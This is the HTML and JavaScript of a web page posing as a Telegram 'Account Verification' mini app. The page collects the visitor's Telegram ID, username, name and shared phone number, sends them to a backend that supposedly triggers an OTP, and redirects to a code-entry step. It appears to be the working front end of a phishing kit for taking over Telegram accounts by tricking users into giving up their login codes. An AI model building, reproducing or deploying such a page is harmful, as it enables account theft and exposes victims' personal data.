<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Verification</title>

<style>
/* --- your CSS unchanged --- */
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{width:100%;max-width:400px;background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3);overflow:hidden}
.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:30px 20px;text-align:center}
.header h1{font-size:24px;margin-bottom:10px}
.content{padding:30px}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:15px}
.hidden{display:none}
.phone-display{background:#f0f0f0;padding:12px;border-radius:10px;margin-bottom:15px;text-align:center;font-weight:700}
.info-box{background:#e8f5e9;padding:15px;border-radius:12px;margin-bottom:20px;text-align:center}
.error{background:#ffebee;color:#c62828;padding:12px;border-radius:8px;margin-bottom:15px;font-size:14px;display:none}
.error.show{display:block}
.loading{text-align:center;padding:40px 20px}
.loading-spinner{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
</style>

</head>
<body>

<div class="container">

<div class="header">
<h1>üîê Account Verification</h1>
<p>Verify your Telegram account</p>
</div>

<div class="content">

<!-- Initial -->
<div id="initial-screen">
<div class="info-box">
<b>Verification Steps</b><br>
1Ô∏è‚É£ Click Share Contact<br>
2Ô∏è‚É£ OTP sent automatically<br>
3Ô∏è‚É£ Enter OTP<br>
</div>

<div id="error-message" class="error"></div>

<button class="btn" onclick="shareContact()">üìû Share My Contact</button>
</div>

<!-- Contact -->
<div id="contact-screen" class="hidden">
<div id="phone-display" class="phone-display">Phone:</div>
<div id="contact-error" class="error"></div>
<div class="info-box">Sending OTP to your phone‚Ä¶</div>
</div>

<!-- Loading -->
<div id="loading-screen" class="hidden">
<div class="loading">
<div class="loading-spinner"></div>
<p id="loading-text">Processing‚Ä¶</p>
</div>
</div>

</div>
</div>


<script>
let sessionId = null;

/* Initialize WebApp */
document.addEventListener('DOMContentLoaded', function () {

 const tg = window.Telegram?.WebApp;
 tg?.expand();

 const user = tg?.initDataUnsafe?.user || {};

 fetch('/init-session', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({
     user_id: user.id,
     username: user.username,
     first_name: user.first_name,
     last_name: user.last_name
   })
 })
 .then(r => r.json())
 .then(data => sessionId = data.session_id);
});

/* -------- SHARE CONTACT -------- */

function shareContact(){
 const tg = window.Telegram?.WebApp;

 tg.requestContact((shared)=>{

   if(shared){
     getPhoneFromInitData();
   } else {
     showError("Contact sharing cancelled");
   }
 });

}

/* -------- READ PHONE FROM TELEGRAM -------- */

function getPhoneFromInitData(){

 const tg = window.Telegram?.WebApp;

 const phone = tg?.initDataUnsafe?.user?.phone_number;

 if(!phone){
   showError("Phone not received from Telegram");
   return;
 }

 document.getElementById("initial-screen").classList.add("hidden");
 document.getElementById("contact-screen").classList.remove("hidden");

 document.getElementById("phone-display").textContent = "Phone: " + phone;

 sendContactToBackend(phone);
}

/* -------- SEND TO BACKEND (OTP) -------- */

function sendContactToBackend(phone){

 showLoading("Sending OTP...");

 fetch('/api/verify-contact',{
   method:'POST',
   headers:{'Content-Type':'application/json'},
   body:JSON.stringify({
     session_id:sessionId,
     phone:phone
   })
 })
 .then(r=>r.json())
 .then(data=>{

   if(data.success){
     window.location.href=data.redirect_url;
   } else {
     hideLoading();
     showError(data.error || "Failed to send OTP");
   }

 })
 .catch(()=>{
   hideLoading();
   showError("Network error");
 });
}

/* -------- UI HELPERS -------- */

function showLoading(text){
 document.getElementById("loading-text").textContent=text;
 document.getElementById("contact-screen").classList.add("hidden");
 document.getElementById("loading-screen").classList.remove("hidden");
}

function hideLoading(){
 document.getElementById("loading-screen").classList.add("hidden");
}

function showError(msg){
 const el=document.getElementById("error-message");
 el.textContent=msg;
 el.classList.add("show");
}

</script>

</body>
</html>
